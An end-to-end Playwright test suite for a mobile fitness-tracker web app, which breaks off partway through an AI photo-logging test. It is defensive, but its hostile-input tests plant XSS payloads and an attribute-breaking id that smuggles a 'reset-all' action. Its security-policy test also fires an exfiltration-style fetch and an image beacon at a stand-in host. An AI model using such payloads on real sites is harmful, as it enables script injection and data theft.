#!/usr/bin/env node
// End-to-end smoke test in a real (Chromium) browser with an iPhone profile.
//   npm run e2e        (needs Playwright: npm i --no-save playwright)
// Starts its own static server, so nothing else has to be running.

import { createServer } from 'node:http';
import { readFile, writeFile, mkdtemp } from 'node:fs/promises';
import { join, extname, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';
import { buildHistory, buildStalledHistory } from './make-history.mjs';
import { exportState } from '../../js/core/state.js';

const root = join(dirname(fileURLToPath(import.meta.url)), '../..');
let pw;
try {
  pw = await import('playwright');
} catch {
  console.error('Playwright is not installed. Run: npm i --no-save playwright');
  process.exit(2);
}
const { chromium, devices } = pw;

const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.webmanifest': 'application/manifest+json', '.json': 'application/json' };
// Serve under a sub-path, exactly like GitHub Pages does for a project site
// (https://<user>.github.io/<repo>/recomp-tracker/). Anything that only works at
// the server root (absolute URLs, a mis-scoped service worker) fails here.
const PREFIX = '/CP3_Borriwat_Santipas/recomp-tracker/';
const server = createServer(async (req, res) => {
  const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
  if (!path.startsWith(PREFIX)) return res.writeHead(404).end('outside the app path');
  const rel = path.slice(PREFIX.length) || 'index.html';
  const file = join(root, rel);
  if (!file.startsWith(root)) return res.writeHead(403).end();
  try {
    const body = await readFile(file);
    res.writeHead(200, { 'content-type': MIME[extname(file)] || 'application/octet-stream', 'cache-control': 'no-store' }).end(body);
  } catch {
    res.writeHead(404).end('not found');
  }
});
await new Promise((r) => server.listen(0, r));
const BASE = `http://localhost:${server.address().port}${PREFIX}`;

let passed = 0;
const failures = [];
async function check(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`  ok   ${name}`);
  } catch (e) {
    failures.push(name);
    console.log(`  FAIL ${name}\n       ${e.message.split('\n').slice(0, 12).join('\n       ')}`);
  }
}
const eq = (a, b, msg = '') => {
  if (a !== b) throw new Error(`${msg} expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`);
};
const ok = (v, msg) => {
  if (!v) throw new Error(msg || 'expected truthy');
};

const browser = await chromium.launch();
const newPage = async (opts = {}) => {
  const ctx = await browser.newContext({ ...devices['iPhone 13'], serviceWorkers: 'block', ...opts });
  const page = await ctx.newPage();
  page.errors = [];
  page.on('pageerror', (e) => page.errors.push(e.message));
  page.on('console', (m) => m.type() === 'error' && page.errors.push(m.text()));
  return { ctx, page };
};
const kcalEaten = async (page) => Number((await page.locator('.card [aria-label$="kilocalories"]').first().getAttribute('aria-label')).match(/^(\d+)/)[1]);
const kcalTarget = async (page) => Number((await page.locator('.ring-wrap').first().getAttribute('aria-label')).match(/of (\d+)/)[1]);
const state = (page) => page.evaluate(() => JSON.parse(JSON.stringify(window.__app.store.state)));
const loadExample = async (page) => {
  await page.goto(BASE);
  await page.click('[data-act="try-example"]');
  await page.waitForSelector('.tabbar');
};

console.log('\nCore flows');
{
  const { ctx, page } = await newPage();
  await check('boots to the welcome screen with no errors', async () => {
    await page.goto(BASE);
    await page.waitForSelector('[data-act="try-example"]');
    eq(page.errors.length, 0, page.errors.join('; '));
  });
  await check('example plan loads: Lift day on a Push day, four meal cards', async () => {
    await page.click('[data-act="try-example"]');
    await page.waitForSelector('.tabbar');
    eq(await page.locator('.seg.tight button[aria-pressed="true"]').first().innerText(), 'Lift');
    eq(await page.locator('[data-key^="meal-"]').count(), 4);
  });
  let plannedKcal;
  await check('"Log as planned" logs the meal and the ring updates', async () => {
    const before = await kcalEaten(page);
    eq(before, 0);
    await page.click('[data-key="meal-lunch"] [data-act="log-planned"]');
    await page.waitForSelector('[data-key="meal-lunch"] .pill.ok');
    plannedKcal = await kcalEaten(page);
    ok(plannedKcal > 700 && plannedKcal < 1000, `lunch kcal ${plannedKcal}`);
    const st = await state(page);
    ok(st.days[Object.keys(st.days)[0]].entries.every((e) => e.src === 'plan'));
  });
  await check('editing an entry amount rescales its macros', async () => {
    await page.click('[data-key="meal-lunch"] [data-act="entry-open"] >> nth=0');
    await page.fill('.sheet input[data-field="qty"]', '100');
    await page.click('[data-act="entry-save"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const k = await kcalEaten(page);
    ok(k < plannedKcal, `kcal should drop: ${k} vs ${plannedKcal}`);
  });
  await check('typing a weight keeps focus on every keystroke and saves on blur', async () => {
    const input = page.locator('input[data-change="weight"]');
    await input.scrollIntoViewIfNeeded();
    await input.click();
    await page.keyboard.type('74.', { delay: 40 });
    // force a full re-render while the field is focused and half-typed (as happens when
    // any other state changes): the morph must leave the focused input alone
    await page.evaluate(() => window.__app.store.update(() => {}));
    await page.waitForTimeout(80);
    await page.keyboard.type('6', { delay: 40 });
    ok(await input.evaluate((el) => el === document.activeElement), 'input lost focus during a re-render');
    eq(await input.inputValue(), '74.6', 'typed text was clobbered by a re-render:');
    await page.keyboard.press('Enter');
    await page.waitForTimeout(200);
    const st = await state(page);
    eq(Object.values(st.days).find((d) => d.weight).weight, 74.6);
  });
  await check('entering weight does not wipe a body-fat reading', async () => {
    await page.fill('input[data-change="bf"]', '17.5');
    await page.keyboard.press('Enter');
    await page.fill('input[data-change="weight"]', '74.8');
    await page.keyboard.press('Enter');
    await page.waitForTimeout(200);
    const d = Object.values((await state(page)).days).find((x) => x.weight);
    eq(d.bf, 17.5);
    eq(d.weight, 74.8);
  });
  await check('data survives a reload (IndexedDB)', async () => {
    await page.waitForTimeout(600); // let the debounced save land
    await page.reload();
    await page.waitForSelector('.tabbar');
    const st = await state(page);
    const day = Object.values(st.days)[0];
    ok(day.entries.length >= 2 && day.weight === 74.8, 'logged data missing after reload');
    ok(await kcalEaten(page) > 0);
  });
  await check('switching the day type swaps the meal slots', async () => {
    await page.click('[data-act="set-type"][data-v="rest"]');
    await page.waitForSelector('[data-key="meal-breakfast"]');
    eq(await page.locator('[data-key^="meal-"]').count(), 3);
    await page.click('[data-act="set-type"][data-v="lift"]');
    await page.waitForSelector('[data-key="meal-pre"]');
  });
  await check('water and supplement toggles work', async () => {
    await page.click('[data-act="water"][data-ml="500"]');
    await page.click('[data-act="supp-toggle"] >> nth=0');
    const day = Object.values((await state(page)).days)[0];
    eq(day.water, 500);
    eq(day.supps.length, 1);
  });
  await check('quick add and a custom food both land in the log', async () => {
    await page.click('[data-key="meal-dinner"] [data-act="add-food"]');
    await page.click('[data-act="sheet-tab"][data-v="quick"]');
    await page.fill('input[data-field="quick.name"]', 'Restaurant dish');
    await page.fill('input[data-field="quick.p"]', '40');
    await page.fill('input[data-field="quick.c"]', '60');
    await page.fill('input[data-field="quick.f"]', '20');
    await page.click('[data-act="quick-add"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const day = Object.values((await state(page)).days)[0];
    const q = day.entries.find((e) => e.name === 'Restaurant dish');
    eq(q.p + q.c + q.f, 120);
  });
  await check('no console errors during the whole flow', async () => eq(page.errors.length, 0, page.errors.join('; ')));
  await ctx.close();
}

console.log('\nTraining');
{
  const { ctx, page } = await newPage();
  await loadExample(page);
  await page.click('[data-act="tab"][data-v="train"]');
  await check('start a workout, log a set, rest timer starts', async () => {
    await page.click('[data-act="workout-start"]');
    await page.waitForSelector('.set-grid');
    await page.fill('[data-change="set-w"][data-ex="0"][data-set="2"]', '22.5');
    await page.fill('[data-change="set-r"][data-ex="0"][data-set="2"]', '10');
    await page.click('[data-act="set-done"][data-ex="0"][data-set="2"]');
    await page.waitForSelector('.timerbar');
    const t = await page.locator('#timer-text').innerText();
    ok(/^\d:\d\d$/.test(t), `timer text ${t}`);
  });
  await check('ticking a blank set copies the previous set\'s weight', async () => {
    await page.click('[data-act="set-done"][data-ex="0"][data-set="3"]');
    const st = await state(page);
    const w = Object.values(st.days).find((d) => d.workout).workout;
    eq(w.exercises[0].sets[3].w, 22.5);
    eq(w.exercises[0].sets[3].done, true);
  });
  await check('timer can be adjusted and skipped', async () => {
    await page.click('[data-act="timer-add"][data-s="15"]');
    await page.click('[data-act="timer-stop"]');
    eq(await page.locator('.timerbar').count(), 0);
  });
  await check('finishing the workout saves it and the day becomes a lift day', async () => {
    await page.click('[data-act="workout-finish-open"]');
    await page.fill('.sheet input[data-field="burn"]', '320');
    await page.click('[data-act="workout-finish"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const st = await state(page);
    const w = Object.values(st.days).find((d) => d.workout).workout;
    ok(w.finishedAt, 'not finished');
    eq(w.burnKcal, 320);
  });
  await check('Progress shows the strength card once a workout exists', async () => {
    await page.click('[data-act="tab"][data-v="progress"]');
    ok((await page.locator('select[data-change="strength-ex"]').count()) === 1);
  });
  await ctx.close();
}

console.log('\nReview, backup, reset');
{
  const { ctx, page } = await newPage({ acceptDownloads: true });
  await loadExample(page);
  await check('review with no data says to keep logging (no crash)', async () => {
    await page.click('[data-act="tab"][data-v="progress"]');
    await page.click('[data-act="review-open"]');
    await page.waitForSelector('.sheet');
    ok((await page.locator('.sheet').innerText()).includes('not enough data yet'));
    await page.click('[data-act="sheet-close"] >> nth=1');
  });
  await check('restoring a month of history then running the review gives a decision', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'rt-'));
    const f = join(dir, 'history.json');
    await writeFile(f, exportState(buildHistory()));
    await page.click('[data-act="tab"][data-v="more"]');
    await page.setInputFiles('[data-change="backup-file"]', f);
    await page.click('[data-act="confirm-yes"]');
    await page.waitForTimeout(300);
    await page.click('[data-act="tab"][data-v="progress"]');
    await page.click('[data-act="review-open"]');
    await page.waitForSelector('.sheet');
    const txt = await page.locator('.sheet').innerText();
    ok(/Hold|Next/.test(txt), 'no decision shown');
    ok(txt.includes('The numbers'), 'no numbers table');
    await page.click('[data-act="review-save"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    eq((await state(page)).reviews.length, 1);
  });
  await check('export backup downloads a valid file that round-trips', async () => {
    await page.click('[data-act="tab"][data-v="more"]');
    const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act="backup-export"]')]);
    const data = JSON.parse(await readFile(await dl.path(), 'utf8'));
    eq(data.app, 'recomp-tracker');
    ok(Object.keys(data.state.days).length >= 28);
  });
  await check('a corrupt backup is refused with a message and nothing is lost', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'rt-'));
    const f = join(dir, 'bad.json');
    await writeFile(f, '{"not":"a backup"}');
    const before = Object.keys((await state(page)).days).length;
    await page.setInputFiles('[data-change="backup-file"]', f);
    await page.waitForSelector('.toast');
    eq(await page.locator('[data-act="confirm-yes"]').count(), 0);
    eq(Object.keys((await state(page)).days).length, before);
  });
  await check('"delete all data" returns to the welcome screen', async () => {
    await page.click('[data-act="reset-all"]');
    await page.click('[data-act="confirm-yes"]');
    await page.waitForSelector('[data-act="try-example"]');
    eq(Object.keys((await state(page)).days).length, 0);
  });
  await check('importing a plan file with problems explains what is wrong', async () => {
    await page.click('[data-act="plan-import-open"]');
    await page.fill('textarea[data-field="text"]', '{"schema":"recomp-tracker-plan/1","dayTypes":{}}');
    ok((await page.locator('.banner.bad li').count()) >= 1);
    eq(await page.locator('[data-act="plan-import"]').getAttribute('disabled') !== null, false, 'button state');
  });
  await check('no console errors', async () => eq(page.errors.length, 0, page.errors.join('; ')));
  await ctx.close();
}

console.log('\nLayout');
for (const [name, profile] of [['iPhone SE (320 px)', 'iPhone SE'], ['iPhone 13', 'iPhone 13'], ['iPhone 13 Pro Max', 'iPhone 13 Pro Max']]) {
  const { ctx, page } = await newPage({ ...devices[profile] });
  await loadExample(page);
  for (const tab of ['today', 'plan', 'train', 'progress', 'more']) {
    await check(`${name}: ${tab} has no horizontal overflow`, async () => {
      await page.click(`[data-act="tab"][data-v="${tab}"]`);
      await page.waitForTimeout(150);
      const o = await page.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth }));
      ok(o.sw <= o.cw, `scrollWidth ${o.sw} > clientWidth ${o.cw}`);
    });
  }
  await ctx.close();
}
{
  const { ctx, page } = await newPage({ colorScheme: 'dark' });
  await check('dark mode follows the system setting', async () => {
    await loadExample(page);
    const bg = await page.evaluate(() => window.getComputedStyle(document.body).backgroundColor);
    const [r, g, b] = bg.match(/\d+/g).map(Number);
    ok(r + g + b < 120, `background ${bg} is not dark`);
  });
  await ctx.close();
}


console.log('\nMore flows');
{
  const { ctx, page } = await newPage();
  await loadExample(page);
  const today = async () => {
    const st = await state(page);
    return { st, day: Object.values(st.days)[0] || {} };
  };
  const restore = async (st) => {
    const dir = await mkdtemp(join(tmpdir(), 'rt-'));
    const f = join(dir, 'b.json');
    await writeFile(f, exportState(st));
    await page.click('[data-act="tab"][data-v="more"]');
    await page.setInputFiles('[data-change="backup-file"]', f);
    await page.click('[data-act="confirm-yes"]');
    await page.waitForTimeout(250);
  };

  await check('logging cardio on a lift day switches the targets to Lift + Cardio', async () => {
    const before = await kcalTarget(page);
    await page.click('[data-act="cardio-open"]');
    await page.click('[data-act="cardio-save"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    eq(await page.locator('.seg.tight button[aria-pressed="true"]').first().innerText(), 'Lift+Cardio');
    ok((await kcalTarget(page)) > before, 'target did not grow');
    const { day } = await today();
    eq(day.cardio.length, 1);
    ok(day.cardio[0].kcal > 150, `auto kcal ${day.cardio[0].kcal}`);
  });
  await check('a hand-picked Rest day is upgraded to Cardio when cardio is logged', async () => {
    await page.click('[data-act="cardio-del"]');
    await page.click('[data-act="set-type"][data-v="rest"]');
    await page.click('[data-act="cardio-open"]');
    await page.click('[data-act="cardio-save"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    eq(await page.locator('.seg.tight button[aria-pressed="true"]').first().innerText(), 'Cardio');
  });
  await check('measurements save and show a change against the previous entry', async () => {
    await page.click('[data-act="tab"][data-v="progress"]');
    for (const [date, waist] of [['2026-01-01', '84'], [null, '82.5']]) {
      await page.click('[data-act="measure-open"]');
      if (date) await page.fill('.sheet input[type="date"]', date);
      await page.fill('input[data-input="measure-field"][data-k="waist"]', waist);
      await page.click('[data-act="measure-save"]');
      await page.waitForFunction(() => !document.querySelector('.sheet'));
    }
    eq((await state(page)).measurements.length, 2);
    ok((await page.locator('table.t').first().innerText()).includes('−1.5'), 'delta not shown');
  });
  await check('editing targets applies from today and moves the ring', async () => {
    await page.click('[data-act="tab"][data-v="plan"]');
    await page.click('[data-act="targets-open"]');
    const c = page.locator('input[data-input="target-field"][data-t="lift"][data-k="c"]');
    const old = Number(await c.inputValue());
    await c.fill(String(old + 10));
    await page.click('[data-act="targets-save"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const h = (await state(page)).targetHistory;
    eq(h.length, 2);
    eq(h[1].targets.lift.c, old + 10);
    eq(h[0].targets.lift.c, old, 'old targets must be preserved');
  });
  await check('the supplement chooser changes which supplements appear', async () => {
    await page.click('[data-act="tab"][data-v="more"]');
    await page.click('[data-act="supp-choose"]');
    const before = (await state(page)).prefs.supplementIds.length;
    await page.click('[data-act="supp-pick"] >> nth=3'); // an optional one
    await page.click('.sheet-foot [data-act="sheet-close"]');
    eq((await state(page)).prefs.supplementIds.length, before + 1);
  });
  await check('"Which day is today?" moves the schedule', async () => {
    await page.click('[data-act="tab"][data-v="train"]');
    await page.click('[data-act="program-open"]');
    await page.click('[data-act="program-set"][data-n="3"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    eq((await page.locator('.page-head h1').innerText()).trim(), 'Legs');
    await page.click('[data-act="session-pick"]');
    await page.click('[data-act="session-start"][data-k="pull"]');
    await page.waitForSelector('.set-grid');
    eq((await state(page)).days[Object.keys((await state(page)).days)[0]].workout.dayKey, 'pull');
    await page.click('[data-act="workout-cancel"]');
    await page.click('[data-act="confirm-yes"]');
  });
  await check('swapping a planned ingredient adjusts that meal for today only', async () => {
    await page.click('[data-act="tab"][data-v="today"]');
    await page.click('[data-act="set-type"][data-v="lift"]');
    await page.click('[data-key="meal-dinner"] [data-act="planned-item"] >> nth=0');
    await page.click('[data-act="planned-swap"]');
    await page.click('[data-act="swap-pick"] >> nth=0');
    await page.click('[data-act="swap-apply"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    ok((await page.locator('[data-key="meal-dinner"] .pill.warn').count()) === 1, 'no "Adjusted today" pill');
    const { st, day } = await today();
    ok(day.adjust.dinner.length >= 2);
    ok(JSON.stringify(st.plan.menus.A.days.lift.dinner).includes('"q"'), 'plan itself untouched');
    await page.click('[data-key="meal-dinner"] [data-act="reset-adjust"]');
    eq(Object.keys((await today()).day.adjust).includes('dinner'), false);
  });
  await check('an off-plan meal triggers the rebalance offer and applying it resizes the rest', async () => {
    await page.click('[data-key="meal-lunch"] [data-act="add-food"]');
    await page.click('[data-act="sheet-tab"][data-v="quick"]');
    await page.fill('input[data-field="quick.name"]', 'Big restaurant lunch');
    await page.fill('input[data-field="quick.p"]', '30');
    await page.fill('input[data-field="quick.c"]', '150');
    await page.fill('input[data-field="quick.f"]', '60');
    await page.click('[data-act="quick-add"]');
    await page.waitForSelector('[data-act="rebalance-open"]');
    await page.click('[data-act="rebalance-open"]');
    await page.click('[data-act="rebalance-apply"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const { day } = await today();
    ok(Object.keys(day.adjust).length >= 2, 'no adjusted meals');
    const carbs = (slot) => day.adjust[slot].reduce((a, i) => a + i.qty, 0);
    ok(carbs('dinner') > 0);
    eq(await page.locator('[data-act="rebalance-open"]').count(), 0, 'offer should disappear once rebalanced');
  });
  await check('review says NEXT, applying it lowers carbs, the menu goes stale, resizing fixes it', async () => {
    await restore(buildStalledHistory());
    await page.click('[data-act="tab"][data-v="progress"]');
    await page.click('[data-act="review-open"]');
    await page.waitForSelector('.sheet');
    ok((await page.locator('.sheet').innerText()).includes('Next: take the next step'), 'expected NEXT');
    await page.click('[data-act="review-apply"]');
    await page.click('[data-act="confirm-yes"]');
    await page.waitForSelector('.sheet [data-act="review-apply"][disabled]');
    const h = (await state(page)).targetHistory;
    eq(h.length, 2);
    eq(h[0].targets.lift.c - h[1].targets.lift.c, 25);
    eq(h[0].targets.rest.c - h[1].targets.rest.c, 0);
    await page.click('.sheet-foot [data-act="sheet-close"]');
    await page.click('[data-act="tab"][data-v="plan"]');
    await page.waitForSelector('[data-act="menu-rescale"]');
    await page.click('[data-act="menu-rescale"]');
    await page.click('[data-act="confirm-yes"]');
    await page.waitForFunction(() => !document.querySelector('[data-act="menu-rescale"]'));
  });
  await check('the calculator updates targets and the review floor values', async () => {
    await page.click('[data-act="tab"][data-v="more"]');
    await page.click('[data-act="calc-open"]');
    await page.click('[data-act="calc-apply"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    const st = await state(page);
    // same-day edits replace the earlier entry, so the review's change and this one share a row
    ok(st.targetHistory.length >= 2);
    ok(st.plan.dayTypes.lift.tdee > st.plan.dayTypes.rest.tdee);
    const last = st.targetHistory.at(-1).targets;
    ok(last.lift.kcal === last.lift.p * 4 + last.lift.c * 4 + last.lift.f * 9);
  });
  await check('no console errors in any of these flows', async () => eq(page.errors.length, 0, page.errors.join('; ')));
  await ctx.close();
}

console.log('\nWelcome paths');
{
  const { ctx, page } = await newPage();
  await check('"set up from my body stats" builds a working target-only plan', async () => {
    await page.goto(BASE);
    await page.click('[data-act="calc-welcome"]');
    await page.fill('input[data-input="calc-field"][data-k="age"]', '30');
    await page.fill('input[data-input="calc-field"][data-k="heightCm"]', '178');
    await page.fill('input[data-input="calc-field"][data-k="weightKg"]', '78');
    await page.fill('input[data-input="calc-field"][data-k="bfPct"]', '18');
    await page.click('[data-act="calc-create"]');
    await page.waitForSelector('.tabbar');
    ok(await kcalTarget(page) > 1800);
    eq(await page.locator('[data-key^="meal-"]').count(), 3);
    // no menus and no program: Plan and Train degrade gracefully instead of crashing
    await page.click('[data-act="tab"][data-v="plan"]');
    ok((await page.locator('main').innerText()).includes('no meal menus'));
    await page.click('[data-act="tab"][data-v="train"]');
    ok((await page.locator('main').innerText()).includes('does not include a training program') || (await page.locator('main').innerText()).includes("doesn't include a training program"));
    // logging a quick entry still works
    await page.click('[data-act="tab"][data-v="today"]');
    await page.click('[data-key="meal-meal1"] [data-act="add-food"]');
    await page.click('[data-act="sheet-tab"][data-v="quick"]');
    await page.fill('input[data-field="quick.p"]', '30');
    await page.click('[data-act="quick-add"]');
    eq(await kcalEaten(page), 120);
  });
  await check('calculator refuses to create a plan without the basics', async () => {
    const { ctx: c2, page: p2 } = await newPage();
    await p2.goto(BASE);
    await p2.click('[data-act="calc-welcome"]');
    ok((await p2.locator('[data-act="calc-create"]').getAttribute('disabled')) !== null, 'button should be disabled');
    await c2.close();
  });
  await check('no console errors', async () => eq(page.errors.length, 0, page.errors.join('; ')));
  await ctx.close();
}


console.log('\nHostile input');
{
  const { ctx, page } = await newPage();
  await check('markup in a plan file is shown as text and never executed', async () => {
    const { buildExamplePlan } = await import('../../js/data/example-plan.js');
    const p = buildExamplePlan();
    p.name = '<img src=x onerror="window.__xss=1">Evil plan';
    p.supplements[0].name = '"><script>window.__xss=2</script>';
    p.supplements[0].note = '<b onmouseover="window.__xss=3">hi</b>';
    p.menus.A.label = '<svg onload="window.__xss=4">';
    p.program.days.push.label = '</div><img src=x onerror="window.__xss=5">';
    await page.goto(BASE);
    await page.click('[data-act="plan-import-open"]');
    await page.fill('textarea[data-field="text"]', JSON.stringify(p));
    await page.click('[data-act="plan-import"]');
    await page.waitForSelector('.tabbar');
    for (const tab of ['today', 'plan', 'train', 'more']) {
      await page.click(`[data-act="tab"][data-v="${tab}"]`);
      await page.waitForTimeout(100);
    }
    ok((await page.locator('main').innerText()).includes('<img src=x'), 'name should appear literally');
    await page.click('[data-act="supp-choose"]'); // the supplement list shows the hostile name too
    await page.waitForSelector('.sheet');
    ok((await page.locator('.sheet').innerText()).includes('<script>window.__xss=2</script>'), 'supplement name should appear literally');
    await page.waitForTimeout(150);
    eq(await page.evaluate(() => window.__xss), undefined, 'injected script ran');
    eq(await page.locator('img[src="x"]').count(), 0, 'injected element exists');
    await page.click('.sheet-foot [data-act="sheet-close"]');
    // long unbroken text must wrap instead of widening the page (that hides the tab bar)
    for (const tab of ['today', 'plan', 'train', 'progress', 'more']) {
      await page.click(`[data-act="tab"][data-v="${tab}"]`);
      await page.waitForTimeout(80);
      const o = await page.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth }));
      ok(o.sw <= o.cw, `${tab}: page is ${o.sw}px wide on a ${o.cw}px screen`);
    }
  });
  await check('a plan with an attribute-breaking id is refused with a clear message', async () => {
    const { buildExamplePlan } = await import('../../js/data/example-plan.js');
    const p = buildExamplePlan();
    p.supplements[0].id = 'x" data-act="reset-all';
    await page.click('[data-act="tab"][data-v="more"]');
    await page.click('[data-act="reset-all"]');
    await page.click('[data-act="confirm-yes"]');
    await page.waitForSelector('[data-act="plan-import-open"]');
    await page.click('[data-act="plan-import-open"]');
    await page.fill('textarea[data-field="text"]', JSON.stringify(p));
    ok((await page.locator('.banner.bad').innerText()).includes('not a valid id'));
  });
  await ctx.close();
}

console.log('\nAI photo logging');
{
  // A pretend Anthropic server, so these tests need no real key and cost nothing.
  const API = 'https://api.anthropic.com/v1/messages';
  const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
  const KEY = 'sk-ant-api03-' + 'T'.repeat(40);
  const KEY_STORAGE = 'recomp-tracker:ai-key';
  const reply = (obj, extra = {}) => ({ status: 200, body: { id: 'msg_test', type: 'message', role: 'assistant', model: 'claude-opus-5-5', stop_reason: 'end_turn', content: [{ type: 'text', text: typeof obj === 'string' ? obj : JSON.stringify(obj) }], usage: { input_tokens: 1800, output_tokens: 400 }, ...extra } });
  const MEAL = {
    is_food: true, meal_name: 'Chicken and rice',
    items: [
      { name: 'Grilled chicken breast', grams: 180, protein_g: 54, carbs_g: 0, fat_g: 7, alcohol_g: 0, confidence: 'medium', basis: 'about one large fillet' },
      { name: 'Steamed jasmine rice', grams: 240, protein_g: 6, carbs_g: 68, fat_g: 1, alcohol_g: 0, confidence: 'high', basis: '1.5 cups cooked' },
      { name: 'Chilli dipping sauce', grams: 40, protein_g: 0, carbs_g: 10, fat_g: 0, alcohol_g: 0, confidence: 'low', basis: 'small dish' },
    ],
    notes: 'Marinade oil is not visible.',
  };
  async function mockApi(target, handler) {
    const calls = [];
    await target.route(API, async (route) => {
      const req = route.request();
      if (req.method() === 'OPTIONS') return route.fulfill({ status: 200, headers: CORS });
      const call = { url: req.url(), headers: req.headers(), raw: req.postData(), body: JSON.parse(req.postData()) };
      calls.push(call);
      const r = await handler(call, calls.length);
      if (r === 'abort') return route.abort('connectionfailed');
      return route.fulfill({ status: r.status, headers: { ...CORS, 'content-type': 'application/json' }, body: JSON.stringify(r.body) });
    });
    return calls;
  }
  const tmp = await mkdtemp(join(tmpdir(), 'rt-photo-'));
  // A real JPEG, optionally with a fake EXIF block so we can see it get stripped.
  async function makeJpeg(page, w, h, secret) {
    const dataUrl = await page.evaluate(({ w, h }) => {
      const c = document.createElement('canvas');
      c.width = w;
      c.height = h;
      const x = c.getContext('2d');
      const g = x.createLinearGradient(0, 0, w, h);
      g.addColorStop(0, '#c0392b');
      g.addColorStop(1, '#f1c40f');
      x.fillStyle = g;
      x.fillRect(0, 0, w, h);
      x.fillStyle = '#fff';
      x.beginPath();
      x.arc(w / 2, h / 2, Math.min(w, h) / 4, 0, 7);
      x.fill();
      return c.toDataURL('image/jpeg', 0.92);
    }, { w, h });
    let bytes = Buffer.from(dataUrl.split(',')[1], 'base64');
    if (secret) {
      const payload = Buffer.concat([Buffer.from('Exif\0\0'), Buffer.from(secret)]);
      const seg = Buffer.concat([Buffer.from([0xff, 0xe1, (payload.length + 2) >> 8, (payload.length + 2) & 255]), payload]);
      bytes = Buffer.concat([bytes.subarray(0, 2), seg, bytes.subarray(2)]);
    }
    const file = join(tmp, `meal-${w}x${h}.jpg`);
    await writeFile(file, bytes);
    return { file, size: bytes.length };
  }
  const jpegSize = (buf) => {
    for (let i = 2; i < buf.length - 9; ) {
      if (buf[i] !== 0xff) { i++; continue; }
      const m = buf[i + 1];
      if (m >= 0xc0 && m <= 0xcf && ![0xc4, 0xc8, 0xcc].includes(m)) return { h: buf.readUInt16BE(i + 5), w: buf.readUInt16BE(i + 7) };
      i += 2 + buf.readUInt16BE(i + 2);
    }
    return null;
  };
  const openPhotoTab = async (page, slot = 'dinner') => {
    // a failed test must not leave a sheet open and wreck the ones after it
    if (await page.locator('.sheet').count()) await page.click('.sheet-head [data-act="sheet-close"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
    await page.click(`[data-key="meal-${slot}"] [data-act="add-food"]`);
    await page.click('[data-act="sheet-tab"][data-v="photo"]');
  };
  const closeSheet = async (page) => {
    await page.click('.sheet-head [data-act="sheet-close"]');
    await page.waitForFunction(() => !document.querySelector('.sheet'));
  };
  const storedKey = (page) => page.evaluate((k) => localStorage.getItem(k), KEY_STORAGE);
  const lastEntries = async (page) => Object.values((await state(page)).days)[0].entries;

  const { ctx, page } = await newPage();
  await loadExample(page);
  const secretNote = 'GPS-LEAK-48.8584N-2.2945E';
  const big = await makeJpeg(page, 3000, 2000, secretNote);

  await check('Photo tab asks for a key first; wrong-looking keys are refused, a good one is accepted', async () => {
    await openPhotoTab(page);
    ok(await page.locator('.sheet').innerText().then((t) => /One-time setup/.test(t) && /platform\.claude\.com/.test(t)), 'setup steps missing');
    eq(await page.locator('[data-act="ai-key-save"]').isDisabled(), true, 'save is disabled with nothing typed');
    await page.fill('input[data-field="aiKeyInput"]', 'hello there');
    await page.click('[data-act="ai-key-save"]');
    ok(/no spaces/.test(await page.locator('.sheet [role="alert"]').innerText()));
    eq(await storedKey(page), null);
    await page.fill('input[data-field="aiKeyInput"]', KEY);
    await page.click('[data-act="ai-key-save"]');
    await page.waitForSelector('input[data-change="photo-file"]', { state: 'attached' });
    eq(await storedKey(page), KEY);
    eq(await page.locator('input[data-field="aiKeyInput"]').count(), 0, 'key field is gone once saved');
  });

  await check('the key is stored outside the app data, so it can never be in a backup', async () => {
    ok(!JSON.stringify(await state(page)).includes('sk-ant'), 'key found in app state');
    await closeSheet(page);
    await page.click('[data-act="tab"][data-v="more"]');
    const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act="backup-export"]')]);
    const text = await readFile(await dl.path(), 'utf8');
    ok(JSON.parse(text).app === 'recomp-tracker' && !text.includes('sk-ant'), 'backup contains the key');
    await page.click('[data-act="tab"][data-v="today"]');
  });

  await check('a content security policy stops the app sending data anywhere but itself and Anthropic', async () => {
    await ctx.route('https://example.com/**', (r) => r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'ok' }));
    // would succeed (the route above answers it) unless the browser itself refuses
    eq(await page.evaluate(() => fetch('https://example.com/steal?key=1').then(() => 'allowed', () => 'blocked')), 'blocked');
    eq(await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__csp = 1'; document.head.appendChild(s); return window.__csp; }), undefined, 'inline script ran');
    eq(await page.evaluate(() => { const i = new Image(); i.src = 'https://example.com/pixel.gif'; return new Promise((r) => { i.onload = () => r('loaded'); i.onerror = () => r('blocked'); }); }), 'blocked', 'an image beacon was allowed');
    page.errors = page.errors.filter((e) => !/Content Security Policy/.test(e)); // those errors are the point of this test
  });

  let calls;
  await check('a photo is shrunk, stripped of hidden data, and sent with the right headers', async () => {
    calls = await mockApi(ctx, () => reply(MEAL));
    await openPhotoTab(page);
    await page.setInputFiles('input[data-change="photo-file"]', big.file);
    await page.waitForSelector('img.photo-preview');
    await page.fill('input[data-field="photo.note"]', 'no sugar in the tea');
